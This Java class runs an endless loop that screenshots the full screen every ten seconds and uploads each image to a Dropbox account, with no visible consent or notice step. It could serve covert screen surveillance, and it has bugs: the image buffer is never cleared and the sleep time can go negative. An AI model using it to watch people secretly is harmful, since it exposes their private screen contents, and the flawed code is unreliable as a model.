import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    private DbxClientV2 client;
    private InputStream in;

    MyThread(DbxClientV2 client) {
        this.client = client;
    }

    @Override
    public void run() {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
        BufferedImage screenshot;
        ByteArrayOutputStream tempOut = new ByteArrayOutputStream();
        String fileName;
        long startTime;
        long sleepTime;
        try {
            Robot robot = new Robot();
            Rectangle area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            while (true) {
                startTime = System.currentTimeMillis();
                screenshot = robot.createScreenCapture(area);
                ImageIO.write(screenshot, "png", tempOut);
                in = new ByteArrayInputStream(tempOut.toByteArray());
                fileName = "/" + formatter.format(new Date()) + ".png";
                client.files().uploadBuilder(fileName).uploadAndFinish(in);
                sleepTime = 10000 - (System.currentTimeMillis() - startTime);
                sleep(sleepTime);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
